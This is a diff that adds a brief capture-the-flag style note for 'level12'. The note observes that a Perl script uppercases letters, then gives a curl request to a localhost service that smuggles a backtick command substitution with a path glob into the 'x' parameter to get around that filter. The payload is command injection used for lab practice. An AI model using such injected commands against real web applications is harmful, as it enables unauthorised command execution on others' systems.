@@ -1,0 +1,4 @@
+Another Perl so lets read the code. We see a regex changing all alpha char in CAPS
+
+
+curl 'http://localhost:4646/level12.pl?x="`/*/LEVEL12`"'
